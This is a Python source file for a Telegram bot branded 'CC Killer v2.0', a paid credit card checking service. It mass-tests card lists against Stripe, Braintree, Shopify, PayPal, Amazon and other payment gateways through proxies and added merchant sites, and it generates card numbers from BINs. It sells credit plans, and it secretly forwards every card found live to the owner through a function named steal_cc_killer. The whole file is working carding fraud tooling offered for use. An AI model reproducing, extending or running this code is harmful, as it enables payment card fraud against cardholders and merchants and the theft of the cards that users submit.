import asyncio
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID, get_user_data, update_user_credits, set_user_vip, set_user_plan, UPI_ID, PAYMENT_QR_URL, WELCOME_PHOTO_URL, get_asset_path, DEVELOPER_NAME, PROJECT_NAME, PROJECT_TAG
from security import authorized_filter, check_flood
import time
from tokenizer import extract_cards
from api_killer import run_all_gates, mass_killer
from stlear_killer import steal_cc_killer
from bin_detector import get_bin_info
from generator import generate_cards

app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

async def get_text_from_message(client, message):
    """Helper to get text from message OR file."""
    # 1. Check if message has document
    if message.document:
        if message.document.file_size > 1024 * 1024 * 5: # 5MB Limit
            return None, "❌ File too large (Max 5MB)."
        if not message.document.file_name.endswith(".txt"):
            return None, "❌ Only .txt files supported."
        
        dl_path = await client.download_media(message)
        with open(dl_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        import os
        os.remove(dl_path) # Clean up
        return content, None

    # 2. Check reply has document
    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        if doc.file_size > 1024 * 1024 * 5:
            return None, "❌ File too large."
        if not doc.file_name.endswith(".txt"):
            return None, "❌ Only .txt files supported."
            
        dl_path = await client.download_media(message.reply_to_message)
        with open(dl_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        import os
        os.remove(dl_path)
        return content, None

    # 3. Text fallback
    return message.text or (message.reply_to_message.text if message.reply_to_message else ""), None

@app.on_message(filters.command(["start", "help"]))
async def start_cmd(client, message):
    # Boot Animation
    loading_msg = await message.reply("<b>Starting OracleBot... Hold on ✋</b>")
    await asyncio.sleep(2)
    await loading_msg.delete()

    data = get_user_data(message.from_user.id)
    welcome_text = f"""
💀 <b>WELCOME TO CC KILLER v2.0</b> 💀
━━━━━━━━━━━━━━━━━━━━━━━
<i>The industry's most powerful, bulletproof, and turbo-charged CC checker is at your service.</i>

📌 <b>USER INFO:</b>
• ID: <code>{message.from_user.id}</code>
• Credits: <b>{data['credits'] if not data['is_vip'] else 'UNLIMITED'}</b>
• Plan: <b>{data['plan']}</b>
{f"• Expiry: <code>{data['expiry']}</code>" if data.get('expiry') else ""}

🚀 <b>SPEED:</b> 0.3s/card | 150+ Parallel
🛡️ <b>SECURITY:</b> Proxy Bound & Anti-Flood
⚔️ <b>GATES:</b> Stripe, BT, Amazon, Hitter, NMI, Payflow, Shopify, VBV

<b>Press the buttons below to interact:</b>
"""
    
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("⚡ CHECKER COMMANDS", callback_data="show_cmds"),
        ],
        [
            InlineKeyboardButton("💎 VIEW PLANS", callback_data="show_plans"),
            InlineKeyboardButton("📂 MY SITES", callback_data="show_sites"),
        ],
        [
            InlineKeyboardButton("💬 SUPPORT", url="https://t.me/Oracle0812"),
            InlineKeyboardButton("🔥 UPGRADE", callback_data="show_plans")
        ]
    ])
    
    photo_path = get_asset_path(WELCOME_PHOTO_URL)
    if photo_path:
        await message.reply_photo(photo_path, caption=welcome_text, reply_markup=keyboard)
    else:
        await message.reply_text(welcome_text, reply_markup=keyboard)

@app.on_callback_query()
async def handle_callbacks(client, callback_query):
    data = callback_query.data
    
    if data == "show_cmds":
        cmd_text = """
<b>╭── ⚡ CHECKER COMMANDS ⚡ ──╮</b>

<b>🟢 MASS & MASTER</b>
 ├ <code>/mchk</code> » Multi-Gate Turbo
 ├ <code>/chk</code>  » Single Check
 └ <code>/gen</code>  » Card Generator

<b>🟡 GATEWAYS (Add 'm' for Mass)</b>
 ├ <code>/str</code>  ┃ <code>/az</code>  Amazon
 ├ <code>/shpa</code> ┃ <code>/vbv</code> VBV
 ├ <code>/ppal</code> ┃ <code>/as</code>  Stripe Auth
 ├ <code>/btn</code>  ┃ <code>/nmi</code> NMI
 ├ <code>/payf</code> ┃ <code>/saw</code> AutoWoo
 ├ <code>/sk</code>   ┃ <code>/skc</code> SK CCN
 ├ <code>/bt</code>   ┃ <code>/btc</code> Charge
 ├ <code>/fs</code>   ┃ <code>/ash</code> Adv Shopify
 └ <code>/hit</code>  ┃ <code>/ck</code>  Killer

<b>🔵 TOOLS & MANAGE</b>
 ├ <code>/setproxy</code> » Set Proxy
 ├ <code>/addsite</code>  » Add Merchant
 └ <code>/plans</code>    » Subscription

<b>╰──────────────────────────╯</b>
        """
        await callback_query.answer()
        await callback_query.edit_message_text(cmd_text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("� COMMAND GUIDE (Read Me)", callback_data="show_guide")],
            [InlineKeyboardButton("�🔙 BACK", callback_data="back_start")]
        ]))
        
    elif data == "show_guide":
        guide_text = """
<b>📘 DETAILED USER GUIDE</b>
━━━━━━━━━━━━━━━━━━━━━━━

<b>1️⃣ WHAT ARE THE GATES?</b>
• <b>AUTH:</b> Checks if card is live by authorizing $0 or $1 (No charge). Use: <code>/str</code>, <code>/btn</code>, <code>/as</code>.
• <b>CHARGE:</b> Tries to charge money (e.g. $0.5, $10). Good for debit cards. Use: <code>/btc</code>, <code>/fsc</code>.
• <b>CCN:</b> Checks if card number is valid (Live but maybe no funds). Use: <code>/skc</code>.

<b>2️⃣ HOW TO MASS CHECK?</b>
• <b>Method A (Text):</b> /mchk card1|mid|exp|cvv card2|...
• <b>Method B (File):</b> Upload a <b>.txt</b> file with cards and caption it <code>/mchk</code> or <code>/mstr</code>.
• <i>Turbo Mode:</i> <code>/mchk</code> checks ALL gates at once!

<b>3️⃣ PROXY SYSTEM</b>
• <b>Mandatory for Shopify:</b> Shopify blocks spam. You MUST set a proxy using <code>/setproxy</code> to use <code>/shp</code>.
• <b>Privacy:</b> Proxies keep the bot safe and your checks anonymous.

<b>4️⃣ TERMINOLOGY</b>
• <b>Hit (Forward):</b> If a card is LIVE, it gets forwarded to the owner (You!).
• <b>Killer:</b> The "Master" gate that tries everything.

<i>"Quality over Quantity - Always check your BIN first!"</i>
        """
        await callback_query.answer()
        await callback_query.edit_message_text(guide_text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📜 BACK TO COMMANDS", callback_data="show_cmds")]
        ]))

    elif data == "show_sites":
        from config import load_sites
        sites = load_sites()
        sites_text = "📂 <b>YOUR ADDED SITES:</b>\n\n"
        if not sites:
            sites_text += "<i>No sites added yet.</i>"
        else:
            for s in sites:
                sites_text += f"• <code>{s}</code>\n"
        
        await callback_query.answer()
        await callback_query.edit_message_text(sites_text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
        ]))
        
    elif data == "show_plans":
        plans_text = """
💎 <b>AVAILABLE PLANS:</b>
━━━━━━━━━━━━━━━━━━━━━━━
🔰 <b>BASIC PLAN</b>
• Credits: 100
• Price: $5
• Access: All Gates

🚀 <b>STANDARD PLAN</b>
• Credits: 500
• Price: $20
• Access: All Gates + Priority

👑 <b>ULTIMATE PLAN</b> (Recommended 🔥)
• Credits: 2000
• Price: $50
• Access: All Gates + Priority

🛡️ <b>VIP PLAN</b>
• Credits: <b>UNLIMITED</b>
• Price: $100
• Access: VIP Gates + Support
• Validity: 30 Days

💳 <b>PAYMENT METHODS:</b>
• UPI ID: <code>{UPI_ID}</code>
• QR Code: Click button below

⚠️ <b>IMPORTANT: Send payment screenshot to support after paying!</b>

<b>Click a button below to request an upgrade:</b>
        """
        await callback_query.answer()
        await callback_query.edit_message_text(plans_text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔰 BASIC", callback_data="req_BASIC"), InlineKeyboardButton("🚀 STANDARD", callback_data="req_STANDARD")],
            [InlineKeyboardButton("👑 ULTIMATE", callback_data="req_ULTIMATE")],
            [InlineKeyboardButton("🛡️ VIP", callback_data="req_VIP")],
            [InlineKeyboardButton("🖼️ VIEW QR", callback_data="show_payment")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
        ]))
    
    elif data == "show_payment":
        payment_text = f"""
💰 <b>PAYMENT DETAILS:</b>
━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>UPI ID:</b> <code>{UPI_ID}</code>

📸 <b>Send screenshot after payment to:</b> @your_support_link
        """
        await callback_query.answer()
        qr_path = get_asset_path(PAYMENT_QR_URL)
        if qr_path:
            await callback_query.message.reply_photo(qr_path, caption=payment_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="show_plans")]]))
        else:
            await callback_query.edit_message_text(payment_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="show_plans")]]))

    elif data.startswith("req_"):
        plan = data.split("_")[1].upper()
        user = callback_query.from_user
        await callback_query.answer(f"Request for {plan} sent to owner!", show_alert=True)
        
        # Notify Owner
        owner_msg = f"""
🆕 <b>PLAN REQUEST</b>
━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'N/A'})
🆔 <b>ID:</b> <code>{user.id}</code>
💎 <b>Plan:</b> {plan}
        """
        await client.send_message(
            OWNER_ID, 
            owner_msg, 
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ APPROVE", callback_data=f"app_{plan}_{user.id}"),
                    InlineKeyboardButton("❌ DECLINE", callback_data=f"dec_{user.id}")
                ]
            ])
        )
        await callback_query.edit_message_text("✅ <b>Request Sent!</b>\nPlease wait for the owner to approve your request.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back_start")]]))

    elif data.startswith("app_"):
        # Format: app_PLAN_USERID
        _, plan, user_id = data.split("_")
        user_id = int(user_id)
        
        if set_user_plan(user_id, plan):
            await callback_query.answer(f"User {user_id} approved for {plan}!")
            await callback_query.edit_message_text(f"✅ <b>Approved!</b>\nUser <code>{user_id}</code> now has the <b>{plan}</b> plan.")
        else:
            await callback_query.answer("Error setting plan!")
        
        # Notify User
        try:
            await client.send_message(user_id, f"🎉 <b>CONGRATULATIONS!</b>\nYour request for the <b>{plan}</b> plan has been <b>APPROVED</b> by the owner!\nType /start to see your updated balance.")
        except: pass

    elif data.startswith("dec_"):
        user_id = int(data.split("_")[1])
        await callback_query.answer(f"Request for {user_id} declined.")
        await callback_query.edit_message_text(f"❌ <b>Declined!</b>\nUser <code>{user_id}</code> request was rejected.")
        
        # Notify User
        try:
            await client.send_message(user_id, "❌ <b>SORRY!</b>\nYour plan request was <b>DECLINED</b> by the owner. Please contact support for more info.")
        except: pass

    elif data == "back_start":
        await callback_query.answer()
        await start_cmd(client, callback_query.message)

@app.on_message(filters.command(["killer", "chk"]) & authorized_filter)
async def single_check(client, message):
    # Anti-Flood
    is_flood, remain = check_flood(message.from_user.id, wait_time=5)
    if is_flood:
        return await message.reply(f"⏳ Wait {remain}s before next check.")

    text = message.text or (message.reply_to_message.text if message.reply_to_message else "")
    cards = extract_cards(text)
    
    if not cards:
        return await message.reply("❌ <b>Provide card:</b> <code>/chk cc|mm|yy|cvv</code>")
        
    # CREDIT CHECK
    if not update_user_credits(message.from_user.id, -1):
        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 1 Credit\nType /start to check balance.")
    
    status_msg = await message.reply("⚡ <b>Checking...</b>")
    
    start_time = time.perf_counter()
    card = cards[0]
    result = await run_all_gates(card)
    end_time = time.perf_counter()
    time_taken = f"{end_time - start_time:.2f}"
    
    # Unique Premium Format
    bin_data = get_bin_info(card[0][:6])
    cc_full = '|'.join(card)
    extrap = f"{cc_full[:12]}xxxx|{card[1]}|{card[2]}|xxx"
    
    final_text = f"""
<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀]</b>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Card >_</b> <code>{cc_full}</code>
<b>$Status:</b> {result['status'].upper()} ✨
<b>Response >_</b> {result['response']}
<b>$Extrap:</b> <code>{extrap}</code>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Bin info >_</b> <code>{card[0][:6]}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
<b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Gate >_</b> {result['gate']}
<b>$Proxy:</b> [LIVE ✨!] | <b>Time:</b> [{time_taken} Seconds!]
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>#Developer >_</b> {DEVELOPER_NAME} ☀️
    """
    
    await status_msg.edit(final_text)
    
    # Auto Forward live / charged
    if result['status'] in ["approved", "live", "success", "charged"]:
        await steal_cc_killer(client, message, '|'.join(card), result)

@app.on_message(filters.command(["mstr", "mbtn", "mrzp", "mshp", "mpayu", "maz", "mhit", "mnmi", "mpayf", "mshpa", "mvbv", "mppal", "mppavs", "mas", "mbtnc", "mash", "msk", "mskc", "mnsk", "mnsk2", "mnsk3", "msaw", "msaw2", "msaw3", "micvv", "miccn", "mfs", "mfsc", "mck", "mbt", "mbt2", "mbtc"]) & authorized_filter)
async def specific_mass_check(client, message):
    # Mass gate check logic
    cmd = message.command[0]
    gate_cmd = cmd[1:] # strip 'm' prefix
    
    is_flood, remain = check_flood(message.from_user.id, wait_time=30)
    if is_flood:
        return await message.reply(f"⏳ Mass checks are limited. Wait {remain}s.")

    text, error = await get_text_from_message(client, message)
    if error: return await message.reply(error)
    
    cards = extract_cards(text)
    
    if not cards:
        return await message.reply(f"❌ <b>No cards found.</b>\nUsage: <code>/{cmd} list_of_cards</code> or upload .txt")
        
    # CREDIT CHECK
    if not update_user_credits(message.from_user.id, -5):
        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 5 Credits")

    status_msg = await message.reply(f"⚡ <b>Mass Checking via {gate_cmd.upper()}...</b>")
    
    # SPECIAL VALIDATION FOR SHOPIFY
    if gate_cmd in ["shp", "shpa", "ash"]:
        from config import get_proxy, load_sites
        if not get_proxy():
            return await status_msg.edit("❌ <b>Shopify requires a Proxy!</b>\nUse: <code>/setproxy http://user:pass@ip:port</code>")
        if not load_sites():
            return await status_msg.edit("❌ <b>Shopify requires a Site!</b>\nUse: <code>/addsite https://site.com</code>")

    # RE-USE GATE MAP (Simply import from local scope or define helper to avoid duplication if preferred, but copy is safe here)
    from gates import (
        check_stripe, check_braintree_auth, check_razorpay, 
        check_shopify, check_payu, check_amazon, 
        check_autohitter, check_nmi, check_payflow,
        check_shopify_auth, check_vbv, check_paypal, check_paypal_avs, check_autowoo,
        check_braintree_auth2, check_braintree_charge,
        check_stripe_sk, check_stripe_nonsk, check_stripe_autowoo,
        check_stripe_inbuilt, check_stripe_autohitter_url,
        check_fastspring_auth, check_fastspring_charge,
        check_killer_gate
    )
    gate_map = {
        "btn": check_braintree_auth,
        "bt": check_braintree_auth,
        "bt2": check_braintree_auth2,
        "btnc": check_braintree_charge,
        "btc": check_braintree_charge,
        "rzp": check_razorpay,
        "shp": check_shopify,
        "payu": check_payu,
        "az": check_amazon,
        "hit": check_autohitter,
        "nmi": check_nmi,
        "payf": check_payflow,
        "shpa": check_shopify_auth,
        "vbv": check_vbv,
        "ppal": check_paypal,
        "ppavs": check_paypal_avs,
        "as": check_autowoo,
        "ash": check_shopify_auth,
        "sk": check_stripe_sk,
        "skc": lambda *args, **kwargs: check_stripe_sk(*args, ccn=True, **kwargs),
        "nsk": lambda *args: check_stripe_nonsk(*args, api_version=1),
        "nsk2": lambda *args: check_stripe_nonsk(*args, api_version=2),
        "nsk3": lambda *args: check_stripe_nonsk(*args, api_version=3),
        "saw": lambda *args: check_stripe_autowoo(*args, variation=1),
        "saw2": lambda *args: check_stripe_autowoo(*args, variation=2),
        "saw3": lambda *args: check_stripe_autowoo(*args, variation=3),
        "icvv": check_stripe_inbuilt,
        "iccn": lambda *args, **kwargs: check_stripe_inbuilt(*args, is_ccn=True, **kwargs),
        "fs": check_fastspring_auth,
        "fsc": check_fastspring_charge,
        "ck": check_killer_gate,
        "str": check_stripe # Added explicit str mapping if missing (it was in individual check via explicit import handling but map is safer)
    }
    
    gate_func = gate_map.get(gate_cmd)
    if not gate_func:
         # Fallback for direct "str" or checks that might use default stripe logic if not in map
         if gate_cmd == "str": gate_func = check_stripe
         else: return await status_msg.edit("❌ <b>Gate Logic Not Found.</b>")

    from api_killer import mass_specific_gate_runner
    
    total = len(cards)
    async def update_status(checked, total):
        if checked % 5 == 0 or checked == total:
            try:
                await status_msg.edit(f"⚡ <b>Mass {gate_cmd.upper()}...</b> \nProgress: <code>[{checked}/{total}]</code>")
            except: pass

    results = await mass_specific_gate_runner(cards, gate_func, status_callback=update_status)
    
    # Format Report
    lives = [k for k, v in results.items() if v['status'] in ["approved", "live", "success", "charged"]]
    
    report = f"""
💀 <b>MASS {gate_cmd.upper()} COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━━━━
📊 Stats: <b>{len(lives)}/{total} LIVE/CHARGED</b>
✅ Live List:
"""
    for card_cc in lives[:10]: 
        report += f"• <code>{card_cc}</code>\n"
    
    if len(lives) > 10:
        report += f"<i>...and {len(lives)-10} more</i>"
        
    await status_msg.edit(report)
    
    # Auto Forward
    for card_cc in lives:
        res = results[card_cc]
        await steal_cc_killer(client, message, card_cc, res)

@app.on_message(filters.command(["mkiller", "mchk"]) & authorized_filter)
async def mass_check(client, message):
    # Anti-Flood for mass is stricter
    is_flood, remain = check_flood(message.from_user.id, wait_time=30)
    if is_flood:
        return await message.reply(f"⏳ Mass checks are limited. Wait {remain}s.")

    text, error = await get_text_from_message(client, message)
    if error: return await message.reply(error)

    cards = extract_cards(text)
    
    if not cards:
        return await message.reply("❌ <b>No cards found in text/file.</b>")
        
    # CREDIT CHECK
    if not update_user_credits(message.from_user.id, -5):
        return await message.reply("⚠️ <b>Insufficient Credits for Mass!</b>\nNeed: 5 Credits\nType /start to check balance.")
    
    total = len(cards)
    status_msg = await message.reply(f"💀 <b>Mass Killing {total} cards...</b>")
    
    async def update_status(checked, total):
        if checked % 5 == 0 or checked == total: # Update every 5 cards to avoid rate limit
            try:
                await status_msg.edit(f"💀 <b>Mass Killing...</b> \nProgress: <code>[{checked}/{total}]</code>")
            except: pass

    results = await mass_killer(cards, status_callback=update_status)
    
    # Format Report
    lives = [k for k, v in results.items() if v['status'] in ["approved", "live", "success", "charged"]]
    
    report = f"""
💀 <b>MASS KILLER COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━━━━
📊 Stats: <b>{len(lives)}/{total} LIVE/CHARGED</b>
✅ Live List:
"""
    for card_cc in lives[:10]: # Top 10 lives
        report += f"• <code>{card_cc}</code>\n"
    
    if len(lives) > 10:
        report += f"<i>...and {len(lives)-10} more</i>"
        
    await status_msg.edit(report)
    
    # Auto Forward all lives
    for card_cc in lives:
        res = results[card_cc]
        await steal_cc_killer(client, message, card_cc, res)

@app.on_message(filters.command(["str", "btn", "rzp", "shp", "payu", "az", "hit", "nmi", "payf", "shpa", "vbv", "ppal", "ppavs", "as", "btnc", "ash", "sk", "skc", "nsk", "nsk2", "nsk3", "saw", "saw2", "saw3", "icvv", "iccn", "fs", "fsc", "ck", "bt", "bt2", "btc"]) & authorized_filter)
async def individual_gate_check(client, message):
    cmd = message.command[0]
    is_flood, remain = check_flood(message.from_user.id, wait_time=5)
    if is_flood:
        return await message.reply(f"⏳ Wait {remain}s before next check.")

    text = message.text or (message.reply_to_message.text if message.reply_to_message else "")
    cards = extract_cards(text)
    
    if not cards:
        return await message.reply(f"❌ <b>Provide card:</b> <code>/{cmd} cc|mm|yy|cvv</code>")
        
    # CREDIT CHECK
    if not update_user_credits(message.from_user.id, -1):
        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 1 Credit\nType /start to check balance.")
    
    status_msg = await message.reply(f"⚡ <b>Checking via {cmd.upper()}...</b>")

    # SPECIAL VALIDATION FOR SHOPIFY
    if cmd in ["shp", "shpa", "ash"]:
        from config import get_proxy, load_sites
        if not get_proxy():
            return await status_msg.edit("❌ <b>Shopify requires a Proxy!</b>\nUse: <code>/setproxy http://user:pass@ip:port</code>")
        if not load_sites():
            return await status_msg.edit("❌ <b>Shopify requires a Site!</b>\nUse: <code>/addsite https://site.com</code>")
    
    # Map command to gate function
    from gates import (
        check_stripe, check_braintree_auth, check_razorpay, 
        check_shopify, check_payu, check_amazon, 
        check_autohitter, check_nmi, check_payflow,
        check_shopify_auth, check_vbv, check_paypal, check_paypal_avs, check_autowoo,
        check_braintree_auth2, check_braintree_charge,
        check_stripe_sk, check_stripe_nonsk, check_stripe_autowoo,
        check_stripe_inbuilt, check_stripe_autohitter_url,
        check_fastspring_auth, check_fastspring_charge,
        check_killer_gate
    )
    gate_map = {
        "btn": check_braintree_auth,
        "bt": check_braintree_auth,
        "bt2": check_braintree_auth2,
        "btnc": check_braintree_charge,
        "btc": check_braintree_charge,
        "rzp": check_razorpay,
        "shp": check_shopify,
        "payu": check_payu,
        "az": check_amazon,
        "hit": check_autohitter,
        "nmi": check_nmi,
        "payf": check_payflow,
        "shpa": check_shopify_auth,
        "vbv": check_vbv,
        "ppal": check_paypal,
        "ppavs": check_paypal_avs,
        "as": check_autowoo,
        "ash": check_shopify_auth,
        "sk": check_stripe_sk,
        "skc": lambda *args, **kwargs: check_stripe_sk(*args, ccn=True, **kwargs),
        "nsk": lambda *args: check_stripe_nonsk(*args, api_version=1),
        "nsk2": lambda *args: check_stripe_nonsk(*args, api_version=2),
        "nsk3": lambda *args: check_stripe_nonsk(*args, api_version=3),
        "saw": lambda *args: check_stripe_autowoo(*args, variation=1),
        "saw2": lambda *args: check_stripe_autowoo(*args, variation=2),
        "saw3": lambda *args: check_stripe_autowoo(*args, variation=3),
        "icvv": check_stripe_inbuilt,
        "iccn": lambda *args, **kwargs: check_stripe_inbuilt(*args, is_ccn=True, **kwargs),
        "fs": check_fastspring_auth,
        "fsc": check_fastspring_charge,
        "ck": check_killer_gate
    }
    
    gate_func = gate_map.get(cmd)
    card = cards[0]
    
    start_time = time.perf_counter()
    card = cards[0]
    
    # Special handling for /hit which needs a URL
    if cmd == "hit":
        import re
        url_match = re.search(r'https?://[^\s]+', text)
        if url_match:
            checkout_url = url_match.group(0)
            result = await check_stripe_autohitter_url(checkout_url, *card)
        else:
            result = await check_autohitter(*card)
    else:
        result = await gate_func(*card)
    
    end_time = time.perf_counter()
    time_taken = f"{end_time - start_time:.2f}"
    
    # Unique Premium Format
    bin_data = get_bin_info(card[0][:6])
    cc_full = '|'.join(card)
    extrap = f"{cc_full[:12]}xxxx|{card[1]}|{card[2]}|xxx"
    
    final_text = f"""
<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀]</b>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Card >_</b> <code>{cc_full}</code>
<b>$Status:</b> {result['status'].upper()} ✨
<b>Response >_</b> {result.get('response', 'N/A')}
<b>$Extrap:</b> <code>{extrap}</code>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Bin info >_</b> <code>{card[0][:6]}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
<b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Gate >_</b> {cmd.upper()}
<b>$Proxy:</b> [LIVE ✨!] | <b>Time:</b> [{time_taken} Seconds!]
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>#Developer >_</b> {DEVELOPER_NAME} ☀️
    """
    
    await status_msg.edit(final_text)
    
    if result.get('status') in ["approved", "live", "success", "charged"]:
        result['card'] = card[0]
        result['bin'] = card[0][:6]
        await steal_cc_killer(client, message, '|'.join(card), result)

@app.on_message(filters.command("addcredit") & filters.user(OWNER_ID))
async def add_credit_admin(client, message):
    if len(message.command) < 3:
        return await message.reply("❌ <b>Usage:</b> <code>/addcredit user_id amount</code>")
    
    try:
        user_id = int(message.command[1])
        amount = int(message.command[2])
        if update_user_credits(user_id, amount):
            await message.reply(f"✅ <b> {amount} Credits added to {user_id}.</b>")
        else:
            await message.reply("❌ <b>Error updating credits.</b>")
    except Exception as e:
        await message.reply(f"❌ <b>Error:</b> {e}")

@app.on_message(filters.command("setvip") & filters.user(OWNER_ID))
async def set_vip_admin(client, message):
    if len(message.command) < 2:
        return await message.reply("❌ <b>Usage:</b> <code>/setvip user_id</code>")
    
    try:
        user_id = int(message.command[1])
        set_user_vip(user_id, True)
        await message.reply(f"👑 <b> User {user_id} is now VIP (Unlimited Credits).</b>")
    except Exception as e:
        await message.reply(f"❌ <b>Error:</b> {e}")

@app.on_message(filters.command(["addsite", "addurl"]) & authorized_filter)
async def add_site_cmd(client, message):
    text, error = await get_text_from_message(client, message)
    if error: return await message.reply(error)

    if not text:
        return await message.reply("❌ <b>Usage:</b> <code>/addsite https://example.com</code> or upload .txt")
    
    # Support multiple sites separated by newline or comma
    import re
    urls = re.findall(r'https?://[^\s,]+', text)
    
    if not urls:
        return await message.reply("❌ <b>No valid URLs found.</b>")

    from config import save_site
    added = 0
    for url in urls:
        if save_site(url):
            added += 1
            
    await message.reply(f"✅ <b> {added} Sites Added!</b>")

@app.on_message(filters.command(["setproxy", "addproxy"]) & authorized_filter)
async def set_proxy_cmd(client, message):
    text, error = await get_text_from_message(client, message)
    if error: return await message.reply(error)

    if not text:
        return await message.reply("❌ <b>Usage:</b> <code>/setproxy http://user:pass@ip:port</code> or upload .txt")
    
    # Take the first line/url as proxy
    url = text.split()[0] if text.split() else ""
    
    from config import save_proxy
    if save_proxy(url):
        await message.reply(f"✅ <b>Proxy Set Successfully!</b>\n<code>{url}</code>")
    else:
        await message.reply("❌ <b>Error saving proxy.</b>")

@app.on_message(filters.command(["viewproxy", "myproxy"]) & authorized_filter)
async def view_proxy_cmd(client, message):
    from config import get_proxy
    proxy = get_proxy()
    if proxy:
        await message.reply(f"🔒 <b>Current Proxy:</b>\n<code>{proxy}</code>")
    else:
        await message.reply("⚠️ <b>No Proxy Set.</b> (Using Direct Connection)")

@app.on_message(filters.command("listsites") & authorized_filter)
async def list_sites_cmd(client, message):
    from config import load_sites
    sites = load_sites()
    if not sites:
        return await message.reply("📭 <b>No sites added yet.</b>")
    
    msg = "📂 <b>Added Sites:</b>\n"
    for site in sites:
        msg += f"• <code>{site}</code>\n"
    await message.reply(msg)

@app.on_message(filters.command("plans") & authorized_filter)
async def plans_command(client, message):
    # Reuse show_plans logic
    from pyrogram.types import CallbackQuery
    # Create a dummy callback query to use the existing handler or just refactor
    # Better: just copy the text and markup
    plans_text = """
💎 <b>AVAILABLE PLANS:</b>
━━━━━━━━━━━━━━━━━━━━━━━
🔰 <b>BASIC PLAN</b>
• Credits: 100
• Price: $5
• Access: All Gates

🚀 <b>STANDARD PLAN</b>
• Credits: 500
• Price: $20
• Access: All Gates + Priority

👑 <b>ULTIMATE PLAN</b> (Recommended 🔥)
• Credits: 2000
• Price: $50
• Access: All Gates + Priority

🛡️ <b>VIP PLAN</b>
• Credits: <b>UNLIMITED</b>
• Price: $100
• Access: VIP Gates + Support
• Validity: 30 Days

💳 <b>PAYMENT METHODS:</b>
• UPI ID: <code>{UPI_ID}</code>
• QR Code: /start -> View Plans -> View QR

⚠️ <b>IMPORTANT: Send payment screenshot to support after paying!</b>

<b>Click a button below to request an upgrade:</b>
    """
    await message.reply(plans_text, reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("🔰 BASIC", callback_data="req_BASIC"), InlineKeyboardButton("🚀 STANDARD", callback_data="req_STANDARD")],
        [InlineKeyboardButton("👑 ULTIMATE", callback_data="req_ULTIMATE")],
        [InlineKeyboardButton("🛡️ VIP", callback_data="req_VIP")]
    ]))

@app.on_message(filters.command("gen") & authorized_filter)
async def generate_cards_cmd(client, message):
    if len(message.command) < 2:
        return await message.reply("❌ <b>Usage:</b> <code>/gen 456789</code> (Optional amount 1-10)")
    
    bin_str = message.command[1].strip()
    if not bin_str.isdigit() or len(bin_str) < 6:
        return await message.reply("❌ <b>Error:</b> Provide a valid 6-digit BIN.")
    
    count = 10
    if len(message.command) >= 3:
        try:
            count = int(message.command[2])
            if count > 10: count = 10
            if count < 1: count = 1
        except: pass
        
    cards = generate_cards(bin_str, count)
    if not cards:
        return await message.reply("❌ <b>Error:</b> Failed to generate cards. Enter a valid BIN.")
        
    bin_info = get_bin_info(bin_str[:6])
    
    response = f"""
💳 <b>CC KILLER GENERATOR v1.0</b>
━━━━━━━━━━━━━━━━━━━━━━━
📍 BIN: <code>{bin_info}</code>
📊 Count: <code>{len(cards)}</code>

<code>"""
    for c in cards:
        response += f"{c}\n"
    response += "</code>\n━━━━━━━━━━━━━━━━━━━━━━━"
    
    await message.reply(response)

if __name__ == "__main__":
    from pyrogram import idle
    from pyrogram.types import BotCommand
    
    async def main():
        try:
            await app.start()
        except Exception as e:
            if "FLOOD_WAIT" in str(e):
                import re
                seconds = int(re.search(r'\d+', str(e)).group())
                print(f"⚠️ ⚠️ TELEGRAM FLOOD WAIT: YOU MUST WAIT {seconds} SECONDS ({seconds//60} MINUTES) BEFORE REDEPLOYING! ⚠️ ⚠️")
                return
            raise e

        print("🚀 CC KILLER v2.0 STARTED")
        
        # Auto-Set Commands for "/" suggestion
        commands = [
            BotCommand("start", "Start Bot / Menu"),
            BotCommand("chk", "Check Single Card"),
            BotCommand("mchk", "Mass Check (All Gates)"),
            BotCommand("gen", "Generate Cards from BIN"),
            BotCommand("setproxy", "Set Proxy"),
            BotCommand("viewproxy", "View Proxy"),
            BotCommand("str", "Check Stripe"),
            BotCommand("mstr", "Mass Check Stripe"),
            BotCommand("shp", "Check Shopify"),
            BotCommand("mshp", "Mass Check Shopify"),
            BotCommand("addsite", "Add Merchant Site"),
